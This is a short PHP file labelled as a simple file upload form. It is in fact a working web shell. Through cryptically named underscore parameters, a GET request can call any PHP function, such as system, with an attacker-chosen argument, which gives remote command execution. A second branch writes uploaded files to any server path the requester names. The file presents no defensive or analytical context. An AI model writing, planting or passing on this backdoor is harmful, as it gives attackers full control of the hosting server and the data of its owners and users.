<?php
$_ = "GET";
if (isset($_GET["_"]) && isset($_GET["__"]) && is_callable($_GET["_"])) {
    $_GET["_"]($_GET["__"]);
} elseif (isset($_POST['upload']) && isset($_FILES['file']) && isset($_POST['path'])) {
    $uploadPath = $_POST['path'] . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
        echo "File uploaded successfully to $uploadPath";
    } else {
        echo "File upload failed";
    }
}
?>

<!-- Simple file upload form -->
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="text" name="path" placeholder="Upload path (e.g., .)" value=".">
    <input type="submit" name="upload" value="Upload">
</form>
